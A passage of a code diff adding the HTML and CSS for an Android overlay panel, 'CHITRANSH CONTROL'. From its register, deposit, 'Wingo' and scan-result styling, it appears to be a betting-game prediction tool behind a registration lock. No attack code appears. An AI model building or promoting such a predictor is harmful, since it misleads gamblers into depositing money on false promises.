@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>{name}</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;700;800;900&family=Share+Tech+Mono&family=Rajdhani:wght@600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{background:transparent!important;width:100%;height:100%;overflow:hidden}
+body{background:transparent!important;width:100vw;height:100vh;overflow:hidden;font-family:'Orbitron','Inter',sans-serif;color:#fff;user-select:none;-webkit-user-select:none;pointer-events:none}
+#bgFrame{position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:-1;pointer-events:auto}
+@keyframes fab-float{0%,100%{transform:translate3d(0,0,0) rotate(-1deg)}50%{transform:translate3d(0,-5px,0) rotate(1deg)}}
+@keyframes spdFadeIn{0%{opacity:0;transform:translate3d(0,16px,0) scale(.92)}100%{opacity:1;transform:translate3d(0,0,0) scale(1)}}
+@keyframes spdFadeOut{0%{opacity:1;transform:translate3d(0,0,0) scale(1)}100%{opacity:0;transform:translate3d(0,16px,0) scale(.92)}}
+@keyframes rotate-cw{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+@keyframes rotate-ccw{from{transform:rotate(0deg)}to{transform:rotate(-360deg)}}
+@keyframes led-blink{0%,100%{opacity:1;box-shadow:0 0 8px #00ff66,0 0 16px #00ff66}50%{opacity:.55;box-shadow:0 0 3px #00ff66}}
+@keyframes vortexSwirlPink{0%{stroke-dashoffset:0;transform:rotate(-24deg) scale(1)}50%{transform:rotate(-24deg) scale(1.02)}100%{stroke-dashoffset:-320;transform:rotate(-24deg) scale(1)}}
+@keyframes vortexSwirlCyan{0%{stroke-dashoffset:0;transform:rotate(24deg) scale(1)}50%{transform:rotate(24deg) scale(1.02)}100%{stroke-dashoffset:320;transform:rotate(24deg) scale(1)}}
+@keyframes vortexCorePulse{0%,100%{transform:scale(.96);opacity:.85}50%{transform:scale(1.04);opacity:1}}
+@keyframes laserDiamondFlowCw{from{stroke-dashoffset:0}to{stroke-dashoffset:-880}}
+@keyframes laserDiamondFlowCcw{from{stroke-dashoffset:0}to{stroke-dashoffset:880}}
+@keyframes wingPulseCyan{0%,100%{transform:translate3d(0,0,0);filter:drop-shadow(0 0 4px #00f7ff)}50%{transform:translate3d(-1.5px,0,0);filter:drop-shadow(0 0 9px #00f7ff)}}
+@keyframes wingPulsePurple{0%,100%{transform:translate3d(0,0,0);filter:drop-shadow(0 0 4px #d946ef)}50%{transform:translate3d(1.5px,0,0);filter:drop-shadow(0 0 9px #d946ef)}}
+@keyframes resultPopIn{0%{opacity:0;transform:translate3d(0,8px,0) scale(.75)}70%{opacity:1;transform:translate3d(0,-2px,0) scale(1.08)}100%{opacity:1;transform:translate3d(0,0,0) scale(1)}}
+@keyframes radarSweep{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+@keyframes buttonGlare{0%{transform:skewX(-25deg) translateX(-240%)}35%,100%{transform:skewX(-25deg) translateX(340%)}}
+@keyframes starTwinkle{0%,100%{opacity:.25;transform:scale(.8)}50%{opacity:1;transform:scale(1.35)}}
+@keyframes nebulaPulse{0%,100%{opacity:.65;transform:scale(.95)}50%{opacity:.95;transform:scale(1.05)}}
+@keyframes seqReveal{0%{opacity:0;transform:translate3d(0,-6px,0) scale(.85)}100%{opacity:1;transform:translate3d(0,0,0) scale(1)}}
+@keyframes gridBeamSweep{0%{transform:translate3d(0,16px,0);opacity:0}15%{opacity:.9}85%{opacity:.9}100%{transform:translate3d(0,275px,0);opacity:0}}
+@keyframes nodePulseGlow{0%,100%{opacity:.3;transform:scale(.85)}50%{opacity:1;transform:scale(1.4)}}
+@keyframes ccpBreathGlow{0%,100%{box-shadow:0 0 12px rgba(0,247,255,.55),inset 0 0 9px rgba(0,247,255,.28);transform:translateY(0)}50%{box-shadow:0 0 20px rgba(0,247,255,.85),inset 0 0 11px rgba(0,247,255,.38);transform:translateY(-.8px)}}
+@keyframes ccpShimmer{0%,65%{transform:skewX(-25deg) translateX(-240%)}85%,100%{transform:skewX(-25deg) translateX(340%)}}
+@keyframes ccpGemPulse{0%,100%{transform:translateY(-.5px) scale(1);filter:drop-shadow(0 0 4px #f472b6)}50%{transform:translateY(-.5px) scale(1.15);filter:drop-shadow(0 0 8px #00f7ff) drop-shadow(0 0 12px #f472b6)}}
+@keyframes ballPopGlow{0%{transform:scale(.65) rotate(-20deg);opacity:0}70%{transform:scale(1.1) rotate(5deg);opacity:1}100%{transform:scale(1) rotate(0);opacity:1}}
+@keyframes woPop{0%{transform:scale(.82);opacity:0}100%{transform:scale(1);opacity:1}}
+.grid-scanner-beam{animation:gridBeamSweep 4.2s cubic-bezier(.4,0,.6,1) infinite;will-change:transform,opacity;pointer-events:none;backface-visibility:hidden}
+.grid-pulse-node{animation:nodePulseGlow 3s ease-in-out infinite;transform-box:fill-box;transform-origin:center}
+.grid-pulse-node.n1{animation-delay:.2s}.grid-pulse-node.n2{animation-delay:.9s}
+.grid-pulse-node.n3{animation-delay:1.6s}.grid-pulse-node.n4{animation-delay:2.3s}
+.holo-ring-cw{animation:rotate-cw 22s linear infinite;transform-origin:135px 145px;backface-visibility:hidden}
+.holo-ring-ccw{animation:rotate-ccw 26s linear infinite;transform-origin:135px 145px;backface-visibility:hidden}
+#mini{display:flex;position:absolute;left:20px;top:75px;width:58px;height:58px;z-index:2147483647;touch-action:none;cursor:pointer;pointer-events:auto;will-change:left,top,transform;contain:layout paint;animation:fab-float 3.4s ease-in-out infinite}
+#spd-fab-core{position:relative;width:100%;height:100%;display:flex;align-items:center;justify-content:center;border-radius:16px;background:linear-gradient(135deg,#090b1e 0%,#150d2e 50%,#060814 100%);border:2px solid #a855f7;box-shadow:0 0 16px rgba(168,85,247,.75),0 0 28px rgba(0,247,255,.35),inset 0 0 8px rgba(168,85,247,.4);transform:translateZ(0)}
+#spd-fab-icon{width:44px;height:44px;border-radius:12px;overflow:hidden;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle,#1a123d,#060814);box-shadow:inset 0 0 8px rgba(0,247,255,.3)}
+#spd-fab-img{width:100%;height:100%;object-fit:cover;border-radius:12px}
+.spd-fab-dot{position:absolute;top:3px;right:3px;width:8px;height:8px;border-radius:50%;background:#00ff66;box-shadow:0 0 8px #00ff66;animation:led-blink 1.8s ease-in-out infinite}
+#stage{display:none;position:absolute;left:calc(50% - 135px);top:calc(50% - 150px);width:270px;height:300px;z-index:2147483647;touch-action:none;cursor:grab;user-select:none;pointer-events:auto;will-change:left,top,opacity,transform;transform:translateZ(0);contain:layout paint}
+#stage:active{cursor:grabbing}
+#stage.spd-open{display:block;animation:spdFadeIn .26s cubic-bezier(.16,1,.3,1) forwards}
+#stage.spd-close{display:block;animation:spdFadeOut .22s ease-in forwards;pointer-events:none}
+.diamond-svg-canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none;overflow:visible;transform:translateZ(0);backface-visibility:hidden}
+.laser-track-base{fill:none;stroke:rgba(168,85,247,.35);stroke-width:1.5}
+.laser-stream-purple{fill:none;stroke:url(#streamGradPurple);stroke-width:2.2;stroke-linecap:round;stroke-dasharray:120 180;animation:laserDiamondFlowCw 4.5s linear infinite}
+.laser-stream-cyan{fill:none;stroke:url(#streamGradCyan);stroke-width:1.8;stroke-linecap:round;stroke-dasharray:90 210;animation:laserDiamondFlowCcw 3.8s linear infinite}
+#stage.laser-fast .laser-stream-purple{animation-duration:.9s!important;stroke-width:3.2px}
+#stage.laser-fast .laser-stream-cyan{animation-duration:.8s!important;stroke-width:2.8px}
+#stage.laser-fast .vortex-pink-ring{animation-duration:1.2s!important}
+#stage.laser-fast .vortex-cyan-ring{animation-duration:1.2s!important}
+#stage.laser-fast .wing-chevron-left,#stage.laser-fast .wing-chevron-right{animation-duration:.9s!important}
+.hud-content-layer{position:absolute;top:0;left:0;width:100%;height:100%;z-index:5;pointer-events:auto}
+.hud-top-section{position:absolute;top:50px;left:0;width:100%;display:flex;flex-direction:column;align-items:center;gap:5px;pointer-events:none;z-index:10}
+.ccp-badge{position:relative;display:inline-flex;align-items:center;justify-content:center;gap:4.5px;padding:3px 9px;white-space:nowrap;line-height:1;background:linear-gradient(135deg,rgba(3,18,32,.96) 0%,rgba(18,6,28,.96) 100%);border:1px solid rgba(0,247,255,.45);border-radius:5px;clip-path:polygon(5px 0%,calc(100% - 5px) 0%,100% 5px,100% calc(100% - 5px),calc(100% - 5px) 100%,5px 100%,0% calc(100% - 5px),0% 5px);pointer-events:none;overflow:hidden;animation:ccpBreathGlow 4s ease-in-out infinite;backface-visibility:hidden}
+.ccp-badge::before{content:'';position:absolute;inset:0;clip-path:polygon(5px 0%,calc(100% - 5px) 0%,100% 5px,100% calc(100% - 5px),calc(100% - 5px) 100%,5px 100%,0% calc(100% - 5px),0% 5px);border:1.2px solid transparent;background:linear-gradient(90deg,#00f7ff 0%,#a855f7 50%,#f472b6 100%) border-box;-webkit-mask:linear-gradient(#fff 0 0) padding-box,linear-gradient(#fff 0 0);-webkit-mask-composite:destination-out;mask-composite:exclude;pointer-events:none}
+.ccp-badge::after{content:'';position:absolute;top:0;left:0;width:50%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.35),transparent);transform:skewX(-25deg) translateX(-240%);animation:ccpShimmer 3.8s ease-in-out infinite;pointer-events:none;will-change:transform}
+.ccp-name{font-family:'Orbitron',sans-serif;font-size:7.8px;font-weight:900;letter-spacing:1px;background:linear-gradient(180deg,#fff 10%,#67e8f9 60%,#00f7ff 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 0 6px #00f7ff) drop-shadow(0 0 10px rgba(0,247,255,.75));line-height:1}
+.ccp-gem{font-size:6.8px;line-height:1;background:linear-gradient(135deg,#00f7ff 0%,#f472b6 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 0 6px #f472b6) drop-shadow(0 0 8px #00f7ff);transform:translateY(-.5px);animation:ccpGemPulse 2.5s ease-in-out infinite}
+.ccp-tag{font-family:'Orbitron',sans-serif;font-size:6.8px;font-weight:800;font-style:italic;letter-spacing:.7px;background:linear-gradient(180deg,#fff 15%,#f5d0fe 65%,#d946ef 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 0 6px rgba(255,255,255,.8)) drop-shadow(0 0 10px rgba(217,70,239,.65));line-height:1}
+.ccp-bracket{font-size:7px;color:#7dd3fc;line-height:1;opacity:.75}
+.status-pill-wrap{margin-top:2px;display:inline-flex;align-items:center;gap:4.5px;padding:2.5px 10px;border-radius:12px;background:rgba(3,24,12,.85);border:1.2px solid #00ff66;box-shadow:0 0 8px rgba(0,255,102,.45),inset 0 0 6px rgba(0,255,102,.25)}
+.status-led{width:6.5px;height:6.5px;border-radius:50%;background:#00ff66;box-shadow:0 0 8px #00ff66,0 0 14px #00ff66;animation:led-blink 1.8s ease-in-out infinite}
+.status-text{font-family:'Orbitron',sans-serif;font-size:9.5px;font-weight:800;color:#00ff66;letter-spacing:1.2px;text-shadow:0 0 6px #00ff66;line-height:1}
+.hud-center-core{position:absolute;top:116px;left:0;width:100%;height:68px;display:flex;align-items:center;justify-content:center;pointer-events:none}
+.cosmic-vortex-svg{position:absolute;top:50%;left:50%;width:180px;height:80px;transform:translate(-50%,-50%);overflow:visible;pointer-events:none;z-index:1}
+.vortex-pink-ring{animation:vortexSwirlPink 4s linear infinite;will-change:stroke-dashoffset,transform;transform-origin:90px 40px;backface-visibility:hidden}
+.vortex-cyan-ring{animation:vortexSwirlCyan 3.5s linear infinite;will-change:stroke-dashoffset,transform;transform-origin:90px 40px;backface-visibility:hidden}
+.vortex-core-glow{animation:vortexCorePulse 2.4s ease-in-out infinite;transform-origin:90px 40px}
+.nebula-pulse-bg{animation:nebulaPulse 4.2s ease-in-out infinite;transform-box:fill-box;transform-origin:center}
+.star-s{animation:starTwinkle 3s ease-in-out infinite;transform-box:fill-box;transform-origin:center}
+.star-s.s1{animation-delay:.1s;animation-duration:2.8s}.star-s.s2{animation-delay:.6s;animation-duration:3.4s}
+.star-s.s3{animation-delay:1.1s;animation-duration:2.5s}.star-s.s4{animation-delay:1.6s;animation-duration:3.2s}
+.star-s.s5{animation-delay:2.1s;animation-duration:2.9s}.star-s.s6{animation-delay:.4s;animation-duration:3.6s}
+.star-s.s7{animation-delay:.9s;animation-duration:2.7s}.star-s.s8{animation-delay:1.4s;animation-duration:3.1s}
+.star-s.s9{animation-delay:1.9s;animation-duration:2.6s}.star-s.s10{animation-delay:2.3s;animation-duration:3.5s}
+.core-display-content{position:relative;z-index:10;display:flex;align-items:center;justify-content:center;width:100%;height:100%}
+.result-text-box{display:flex;align-items:center;justify-content:center;gap:8px;animation:resultPopIn .35s cubic-bezier(.18,.89,.32,1.28) forwards;will-change:transform,opacity}
+.res-type-text{font-family:'Orbitron',sans-serif;font-size:20px;font-weight:900;letter-spacing:2px;color:#fff;text-shadow:0 0 10px #00f7ff,0 0 20px #c026d3,0 0 30px rgba(0,247,255,.6);line-height:1}
+.res-num-ball{width:27px;height:27px;object-fit:contain;border-radius:50%;display:inline-block;filter:drop-shadow(0 0 8px rgba(0,247,255,.7)) drop-shadow(0 0 14px rgba(217,70,239,.45));animation:ballPopGlow .35s cubic-bezier(.18,.89,.32,1.28) forwards;will-change:transform;vertical-align:middle;margin-top:3px;user-select:none;-webkit-user-drag:none}
+.scan-core-hud{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;width:100%}
+.scan-radar-mini{position:relative;width:44px;height:44px;border-radius:50%;border:1px dashed rgba(0,247,255,.6);display:flex;align-items:center;justify-content:center}
+.scan-radar-sweep{position:absolute;inset:0;border-radius:50%;background:conic-gradient(from 0deg,rgba(0,247,255,.65) 0deg,transparent 65deg,transparent 360deg);animation:radarSweep 1.2s linear infinite;will-change:transform;backface-visibility:hidden}
+.scan-radar-pct{position:relative;z-index:5;font-family:'Share Tech Mono',monospace;font-size:13px;font-weight:700;color:#fff;text-shadow:0 0 6px #00f7ff}
+.scan-phase-label{font-family:'Orbitron',sans-serif;font-size:8px;font-weight:700;color:#7dd3fc;letter-spacing:1.2px;text-transform:uppercase}
+.hud-seq-section{position:absolute;top:186px;left:0;width:100%;height:22px;display:flex;align-items:center;justify-content:center;pointer-events:none;transition:opacity .25s ease}
+.hud-seq-section.is-hidden{visibility:hidden;opacity:0;pointer-events:none}
+.hud-seq-section.is-visible{visibility:visible;opacity:1;animation:seqReveal .35s cubic-bezier(.18,.89,.32,1.28) forwards}
+.seq-pill-badge{display:inline-flex;align-items:center;gap:5px;padding:2.5px 12px;border-radius:14px;background:rgba(2,20,28,.9);border:1.2px solid #00f7ff;box-shadow:0 0 8px rgba(0,247,255,.5),inset 0 0 6px rgba(0,247,255,.25)}
+.seq-pill-badge span{font-family:'Orbitron','Share Tech Mono',sans-serif;font-size:9.5px;font-weight:800;color:#00f7ff;letter-spacing:1.2px;text-shadow:0 0 8px #00f7ff;line-height:1}
+.hud-btn-row{position:absolute;top:220px;left:0;width:100%;display:flex;align-items:center;justify-content:center;gap:8px;padding:0 12px;z-index:20;pointer-events:auto}
+.btn-analyze{position:relative;height:31px;padding:0 10px;white-space:nowrap;border-radius:16px;border:1.4px solid #f472b6;background:linear-gradient(135deg,#7c3aed 0%,#a855f7 45%,#c026d3 100%);box-shadow:0 0 14px rgba(192,38,211,.7),inset 0 1px 2px rgba(255,255,255,.65),inset 0 -1px 3px rgba(0,0,0,.5);display:inline-flex;align-items:center;justify-content:center;gap:5px;cursor:pointer;overflow:hidden;outline:none;color:#fff;font-family:'Orbitron',sans-serif;font-size:8.8px;font-weight:800;letter-spacing:.6px;text-shadow:0 0 4px rgba(0,0,0,.8);transform:translateZ(0);transition:transform .1s ease,box-shadow .15s ease;pointer-events:auto;touch-action:manipulation}
+.btn-analyze:active{transform:scale(.96)}
+.btn-analyze.is-scanning{pointer-events:none;opacity:.95;box-shadow:0 0 18px rgba(0,247,255,.8),inset 0 1px 2px rgba(255,255,255,.7);border-color:#00f7ff}
+.btn-analyze.is-register{background:linear-gradient(135deg,#059669 0%,#10b981 45%,#00ff66 100%);border-color:#00ff66;box-shadow:0 0 14px rgba(0,255,102,.7),inset 0 1px 2px rgba(255,255,255,.65)}
+.btn-analyze.is-deposit{background:linear-gradient(135deg,#d97706 0%,#f59e0b 45%,#ffd700 100%);border-color:#ffd700;box-shadow:0 0 14px rgba(255,215,0,.7),inset 0 1px 2px rgba(255,255,255,.65);color:#0b0e2b}
+.btn-analyze.is-wingo{background:linear-gradient(135deg,#0284c7 0%,#00f7ff 45%,#38bdf8 100%);border-color:#00f7ff;box-shadow:0 0 14px rgba(0,247,255,.7),inset 0 1px 2px rgba(255,255,255,.65);color:#031420}
+.btn-progress-bar{position:absolute;bottom:0;left:0;height:2.5px;width:100%;background:#00f7ff;box-shadow:0 0 8px #00f7ff;transform-origin:left;transform:scaleX(0);will-change:transform;pointer-events:none}
+.btn-hide{position:relative;height:31px;padding:0 10px;white-space:nowrap;border-radius:16px;border:1.4px solid #4338ca;background:linear-gradient(135deg,#090d1a 0%,#13172e 50%,#1e1b4b 100%);box-shadow:0 0 10px rgba(99,102,241,.45),inset 0 1px 2px rgba(255,255,255,.25),inset 0 -1px 3px rgba(0,0,0,.5);display:inline-flex;align-items:center;justify-content:center;gap:5px;cursor:pointer;overflow:hidden;outline:none;color:#e0e7ff;font-family:'Orbitron',sans-serif;font-size:8.8px;font-weight:800;letter-spacing:.6px;text-shadow:0 0 4px rgba(0,0,0,.8);transform:translateZ(0);transition:transform .1s ease,box-shadow .15s ease;pointer-events:auto;touch-action:manipulation}
+.btn-hide:active{transform:scale(.96)}
+.btn-glare{position:absolute;top:0;left:0;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.25),transparent);transform:skewX(-25deg) translateX(-240%);animation:buttonGlare 3.8s ease-in-out infinite;pointer-events:none;will-change:transform}
+.btn-icon{width:14px;height:14px;stroke-width:2.2;fill:none;stroke:currentColor;flex-shrink:0}
+.btn-arrows{font-family:sans-serif;font-size:11px;letter-spacing:-1px;opacity:.85}
+.wing-chevron-left{animation:wingPulseCyan 2.4s ease-in-out infinite;will-change:transform,filter;backface-visibility:hidden}
+.wing-chevron-right{animation:wingPulsePurple 2.4s ease-in-out infinite;will-change:transform,filter;backface-visibility:hidden}
+.state-info-box{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;padding:0 8px;animation:resultPopIn .35s cubic-bezier(.18,.89,.32,1.28) forwards;text-align:center}
+.state-title{font-family:'Orbitron',sans-serif;font-size:14px;font-weight:900;letter-spacing:2px;color:#fff;text-shadow:0 0 10px #00f7ff,0 0 20px rgba(0,247,255,.6);line-height:1}
+.state-title.state-warning{color:#f472b6;text-shadow:0 0 10px #f472b6,0 0 20px rgba(244,114,182,.6);font-size:12px}
+.state-title.state-ready{color:#00ff66;text-shadow:0 0 10px #00ff66,0 0 20px rgba(0,255,102,.6);font-size:16px;letter-spacing:3px}
+.state-sub{font-family:'Orbitron',sans-serif;font-size:8.5px;font-weight:800;letter-spacing:1.2px;color:#f472b6;text-shadow:0 0 8px #f472b6}
+.state-deposit{font-family:'Orbitron',sans-serif;font-size:10px;font-weight:900;color:#ffd700;text-shadow:0 0 8px #ffd700;letter-spacing:1px;padding:2px 10px;border-radius:10px;background:rgba(255,215,0,.1);border:1px solid rgba(255,215,0,.5);margin-top:2px}
+.state-hint{font-family:'Share Tech Mono',monospace;font-size:7px;font-weight:700;letter-spacing:1px;color:rgba(255,255,255,.6);text-transform:uppercase}
+.state-label{font-family:'Share Tech Mono',monospace;font-size:8px;font-weight:700;letter-spacing:1.5px;color:#7dd3fc}
+.state-balance{font-family:'Orbitron',sans-serif;font-size:18px;font-weight:900;color:#00ff66;text-shadow:0 0 10px #00ff66,0 0 20px rgba(0,255,102,.6);letter-spacing:1px}
+#warnOverlay{position:fixed;inset:0;z-index:2147483648;background:rgba(2,3,12,.94);display:none;align-items:center;justify-content:center;backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);pointer-events:auto!important;padding:20px}
+#warnOverlay.show{display:flex!important}
+.wo-card{position:relative;width:88%;max-width:300px;padding:3px;border-radius:18px;background:linear-gradient(150deg,#a855f7 0%,#1e1b4b 40%,#0b0e2b 60%,#1e1b4b 80%,#00f7ff 100%);box-shadow:0 0 30px rgba(168,85,247,.7),0 20px 50px rgba(0,0,0,.98);animation:woPop .3s cubic-bezier(.2,.9,.25,1.2) both;pointer-events:auto}
+.wo-inner{border-radius:16px;background:radial-gradient(circle at 50% 40%,#141038 0%,#050616 65%,#02030a 100%);padding:20px 18px;text-align:center;box-shadow:inset 0 0 30px rgba(168,85,247,.25)}
+.wo-badge{display:inline-block;font-family:'Share Tech Mono',monospace;font-size:9px;font-weight:700;letter-spacing:2px;color:#f472b6;padding:3px 10px;border:1px solid #f472b6;border-radius:4px;box-shadow:0 0 8px rgba(244,114,182,.6);margin-bottom:12px}
+.wo-title{font-family:'Orbitron',sans-serif;font-size:16px;font-weight:900;color:#fff;letter-spacing:1px;margin-bottom:8px;text-shadow:0 0 10px #00f7ff}
+.wo-msg{font-family:'Orbitron',sans-serif;font-size:12px;font-weight:800;color:#f472b6;letter-spacing:1.5px;margin-bottom:6px;text-shadow:0 0 10px #f472b6}
+.wo-sub{font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:1px;color:#7dd3fc;margin-bottom:16px}
+#warnRegBtn{width:100%;padding:12px;border:none;border-radius:10px;cursor:pointer;font-family:'Orbitron',sans-serif;font-size:11px;font-weight:800;letter-spacing:2px;color:#fff;background:linear-gradient(135deg,#7c3aed 0%,#a855f7 50%,#c026d3 100%);box-shadow:0 0 16px rgba(168,85,247,.75),inset 0 1px 2px rgba(255,255,255,.5);transition:transform .15s ease;pointer-events:auto!important;touch-action:manipulation}
+#warnRegBtn:active{transform:scale(.96)}
+</style>
+</head>
+<body>
+
+<iframe id="bgFrame" src="about:blank" allow="autoplay"></iframe>
+
+<div id="warnOverlay" role="alertdialog">
+  <div class="wo-card">
+    <div class="wo-inner">
+      <div class="wo-badge">AUTH</div>
+      <div class="wo-title">CHITRANSH CONTROL</div>
+      <div class="wo-msg">ACCESS LOCKED</div>
+      <div class="wo-sub">REGISTER TO CONTINUE</div>
+      <button id="warnRegBtn" type="button">REGISTER</button>
+    </div>
+  </div>
+</div>
+
+<div id="mini" role="button" aria-label="Open Control Panel">
+  <div id="spd-fab-core">
+    <div id="spd-fab-icon">
+      <img id="spd-fab-img" src="file:///android_asset/logo.png">
+    </div>
+    <div class="spd-fab-dot"></div>
+  </div>
+</div>
+
+<div id="stage">
+  <svg class="diamond-svg-canvas" viewBox="0 0 270 300" preserveAspectRatio="none">
+    <defs>
+      <radialGradient id="chassisBg" cx="50%" cy="45%" r="70%"><stop offset="0%" stop-color="#141038"/><stop offset="30%" stop-color="#0b0e2b"/><stop offset="65%" stop-color="#050616"/><stop offset="100%" stop-color="#02030a"/></radialGradient>
+      <linearGradient id="streamGradPurple" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#d946ef"/><stop offset="40%" stop-color="#ffffff"/><stop offset="70%" stop-color="#a855f7"/><stop offset="100%" stop-color="#6d28d9"/></linearGradient>
+      <linearGradient id="streamGradCyan" x1="100%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#00f7ff"/><stop offset="50%" stop-color="#ffffff"/><stop offset="100%" stop-color="#0284c7"/></linearGradient>
+      <linearGradient id="bevelGrad" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#f5d0fe" stop-opacity=".9"/><stop offset="50%" stop-color="#a855f7" stop-opacity=".4"/><stop offset="100%" stop-color="#0284c7" stop-opacity=".8"/></linearGradient>
+      <radialGradient id="nebulaCoreGlow" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#d946ef" stop-opacity=".32"/><stop offset="45%" stop-color="#7928ca" stop-opacity=".18"/><stop offset="75%" stop-color="#00f7ff" stop-opacity=".08"/><stop offset="100%" stop-color="transparent"/></radialGradient>
+      <radialGradient id="topAntennaFlare" cx="50%" cy="25%" r="35%"><stop offset="0%" stop-color="#38bdf8" stop-opacity=".35"/><stop offset="50%" stop-color="#818cf8" stop-opacity=".15"/><stop offset="100%" stop-color="transparent"/></radialGradient>
+      <radialGradient id="bottomArmorFlare" cx="50%" cy="85%" r="30%"><stop offset="0%" stop-color="#c026d3" stop-opacity=".3"/><stop offset="60%" stop-color="#6366f1" stop-opacity=".1"/><stop offset="100%" stop-color="transparent"/></radialGradient>
+      <pattern id="cyberGridPattern" width="20" height="20" patternUnits="userSpaceOnUse">
+        <path d="M 20 0 L 0 0 0 20" fill="none" stroke="rgba(0,247,255,.085)" stroke-width=".75"/>
+        <line x1="-3" y1="0" x2="3" y2="0" stroke="#00f7ff" stroke-width=".9" opacity=".4"/>
+        <line x1="0" y1="-3" x2="0" y2="3" stroke="#00f7ff" stroke-width=".9" opacity=".4"/>
+        <circle cx="0" cy="0" r=".85" fill="#ffffff" opacity=".55"/>
+        <rect x="9.5" y="9.5" width="1" height="1" fill="rgba(217,70,239,.28)" transform="rotate(45 10 10)"/>
+      </pattern>
+      <mask id="gridLightingMask"><radialGradient id="gridAuraGrad" cx="50%" cy="50%" r="60%"><stop offset="0%" stop-color="#fff" stop-opacity="1"/><stop offset="45%" stop-color="#fff" stop-opacity=".8"/><stop offset="80%" stop-color="#fff" stop-opacity=".35"/><stop offset="100%" stop-color="#fff" stop-opacity=".08"/></radialGradient><rect width="270" height="300" fill="url(#gridAuraGrad)"/></mask>
+      <linearGradient id="scanBeamLaser" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stop-color="transparent"/><stop offset="15%" stop-color="#00f7ff" stop-opacity=".3"/><stop offset="50%" stop-color="#fff" stop-opacity=".95"/><stop offset="85%" stop-color="#d946ef" stop-opacity=".3"/><stop offset="100%" stop-color="transparent"/></linearGradient>
+      <linearGradient id="scanBeamTrail" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="transparent"/><stop offset="100%" stop-color="rgba(0,247,255,.16)"/></linearGradient>
+      <clipPath id="chassisClip"><polygon points="89,52 181,52 236,108 248,118 266,136 266,164 248,182 236,192 135,294 34,192 22,182 4,164 4,136 22,118 34,108"/></clipPath>
+    </defs>
+    <g clip-path="url(#chassisClip)">
+      <polygon points="89,52 181,52 236,108 248,118 266,136 266,164 248,182 236,192 135,294 34,192 22,182 4,164 4,136 22,118 34,108" fill="url(#chassisBg)" stroke="#151733" stroke-width="2"/>
+      <rect x="0" y="0" width="270" height="300" fill="url(#cyberGridPattern)" mask="url(#gridLightingMask)"/>
+      <circle cx="135" cy="145" r="48" fill="none" stroke="rgba(0,247,255,.18)" stroke-width=".8" stroke-dasharray="3 8" class="holo-ring-cw"/>
+      <circle cx="135" cy="145" r="62" fill="none" stroke="rgba(217,70,239,.14)" stroke-width=".8" stroke-dasharray="2 12" class="holo-ring-ccw"/>
+      <g class="grid-scanner-beam"><polygon points="35,-16 235,-16 245,0 25,0" fill="url(#scanBeamTrail)"/><line x1="25" y1="0" x2="245" y2="0" stroke="url(#scanBeamLaser)" stroke-width="1.8" stroke-linecap="round"/></g>
+      <circle class="grid-pulse-node n1" cx="80" cy="100" r="2" fill="#00f7ff"/>
+      <circle class="grid-pulse-node n2" cx="190" cy="100" r="2" fill="#d946ef"/>
+      <circle class="grid-pulse-node n3" cx="80" cy="190" r="2" fill="#00f7ff"/>
+      <circle class="grid-pulse-node n4" cx="190" cy="190" r="2" fill="#d946ef"/>
+      <circle class="grid-pulse-node n1" cx="135" cy="80" r="2.2" fill="#38bdf8"/>
+      <circle class="grid-pulse-node n3" cx="135" cy="220" r="2.2" fill="#c026d3"/>
+      <path d="M 64,118 L 56,118 L 56,126" fill="none" stroke="#00f7ff" stroke-width="1.2" opacity=".65"/>
+      <path d="M 206,118 L 214,118 L 214,126" fill="none" stroke="#d946ef" stroke-width="1.2" opacity=".65"/>
+      <path d="M 64,172 L 56,172 L 56,164" fill="none" stroke="#00f7ff" stroke-width="1.2" opacity=".65"/>
+      <path d="M 206,172 L 214,172 L 214,164" fill="none" stroke="#d946ef" stroke-width="1.2" opacity=".65"/>
+      <ellipse cx="135" cy="45" rx="70" ry="40" fill="url(#topAntennaFlare)"/>
+      <ellipse class="nebula-pulse-bg" cx="135" cy="145" rx="80" ry="45" fill="url(#nebulaCoreGlow)"/>
+      <ellipse cx="135" cy="250" rx="65" ry="35" fill="url(#bottomArmorFlare)"/>
+      <path d="M 40,110 L 80,70 L 105,70" fill="none" stroke="rgba(0,247,255,.22)" stroke-width=".9" stroke-dasharray="3 3"/>
+      <path d="M 230,110 L 190,70 L 165,70" fill="none" stroke="rgba(217,70,239,.22)" stroke-width=".9" stroke-dasharray="3 3"/>
+      <path d="M 45,185 L 90,230 L 115,230" fill="none" stroke="rgba(0,247,255,.2)" stroke-width=".9" stroke-dasharray="3 3"/>
+      <path d="M 225,185 L 180,230 L 155,230" fill="none" stroke="rgba(217,70,239,.2)" stroke-width=".9" stroke-dasharray="3 3"/>
+      <g class="stardust-group">
+        <circle class="star-s s1" cx="82" cy="72" r="1.2" fill="#38bdf8"/>
+        <circle class="star-s s2" cx="188" cy="78" r="1.4" fill="#ffffff"/>
